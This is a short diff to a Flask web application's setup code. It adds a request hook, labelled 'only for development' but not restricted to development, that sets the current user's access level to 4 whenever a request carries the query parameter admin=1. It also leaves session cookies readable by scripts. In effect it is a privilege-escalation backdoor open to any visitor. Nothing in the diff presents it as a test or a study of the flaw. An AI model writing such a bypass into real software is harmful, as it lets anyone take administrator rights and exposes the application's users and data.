@@ -29,11 +29,18 @@ app.config.update(
     CSRF_ENABLED=config.CSRF_ENABLED,
     SECRET_KEY=config.SECRET_KEY,
     JSON_SORT_KEYS=False,
-    SESSION_COOKIE_HTTPONLY=False,
-    # SESSION_COOKIE_SAMESITE='Lax'
+    SESSION_COOKIE_HTTPONLY=False
 )
-# CORS(app, supports_credentials=True, resources={r"*": {"origins": "*"}})
 CORS(app)
+
+
+# only for development
+@app.before_request
+def before_request():
+    from flask import request
+    from flask_login import current_user
+    if request.args.get('admin') == '1':
+        current_user.access = 4
 
 
 from . import errors
